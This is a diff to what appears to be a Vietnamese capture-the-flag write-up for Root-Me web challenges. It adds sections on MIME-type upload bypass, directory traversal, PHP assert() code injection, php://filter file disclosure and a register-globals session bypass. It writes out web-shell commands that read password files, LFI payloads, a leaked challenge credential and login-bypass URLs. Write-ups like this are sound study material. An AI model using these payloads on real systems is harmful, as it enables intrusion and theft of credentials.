@@ -135,6 +135,88 @@ echo $data;
 
 ?>
 
+?cmd=ls -la
+
+?cmd=cat ../../../.passwd
+
+
+## File upload – MIME type
+
+![image](https://user-images.githubusercontent.com/77602549/164523876-fdd1951d-9f97-4e9e-b4d3-604da8d6cda5.png)
+
+
+Chổ Content-type nó sẽ định nghĩa kiểu dữ liệu mà bạn sẽ upload lên, thay thành image/png nó sẽ hiểu đó là ảnh chứ không phải php file.
+
+?cmd=cat ../../../.passwd
+
+
+
+
+
+## Directory traversal
+
+![image](https://user-images.githubusercontent.com/77602549/164531455-7057e609-5ac9-4234-ac38-7b845bd97dcf.png)
+
+
+
+![image](https://user-images.githubusercontent.com/77602549/164531414-7525dd8f-ad9d-4613-a76b-8889f2b4b565.png)
+
+
+
+
+## PHP - assert()
+![image](https://user-images.githubusercontent.com/77602549/164538756-974ad560-7375-403e-927e-553ec78cc2b4.png)
+
+
+Assert() được dùng giống như else trong điều kiện if vậy, thường được dùng để debug:
+
+$a = 1; 
+assert($a === 1, '$a is not 1'); 
+assert($a === 2, '$a is not 1');
+Sau vài lần thử thì nhận ra đây là dạng code injection. Template của nó:
+
+$i = "includes/" .$_GET['page'];
+$i .= ".php";
+assert(strpos($i, '..') === False, 'Detect hacking');
+
+
+![image](https://user-images.githubusercontent.com/77602549/164540257-9693a9cf-a390-4f01-b3c6-8a116e84374e.png)
+
+
+
+![image](https://user-images.githubusercontent.com/77602549/164540226-f9cc7e33-d0b1-43c8-820e-dfc33750dc17.png)
+
+
+## PHP - Filters
+
+
+Bài này cho thấy impact của PHP streams, cụ thể là filter wrapper, là một trong những dạng LFI, đáng nhẽ phải giải bài này trước thì bài Local File Inclusion – Double encoding này mình đã không phải đi kiếm lời giải. Thử dần các trang dưới, output là dạng base64:
+
+inc=php://filter/convert.base64-encode/resource=accueil.php
+inc=php://filter/convert.base64-encode/resource=login.php
+inc=php://filter/convert.base64-encode/resource=config.php
+inc=php://filter/convert.base64-encode/resource=index.php
+inc=php://filter/convert.base64-encode/resource=ch12.php
+Với trang login.php, sau khi decode base64 thì ta tìm được trang config.php. Flag nằm trong đây:
+
+$username="admin";
+$password="DAPt9D2mky0APAF";
+
+
+
+## PHP - register globals
+
+Sau vài lần thử thì với biến _SESSION, ta thấy xuất hiện lỗi
+
+http://challenge01.root-me.org/web-serveur/ch17/?_SESSION=qwerty1234567890
+Warning: Illegal string offset 'logged' in /challenge/web-serveur/ch17/index.php on line 11
+Vậy ta biết phần tử trong biến _SESSION là logged, ta thử link dưới rồi bấm enter mà không cần nhập password vào
+
+http://challenge01.root-me.org/web-serveur/ch17/?_SESSION.logged=1 # FAIL, PHP ko set như vầy
+http://challenge01.root-me.org/web-serveur/ch17/?_SESSION[logged]=1
+
+
+
 
 
 
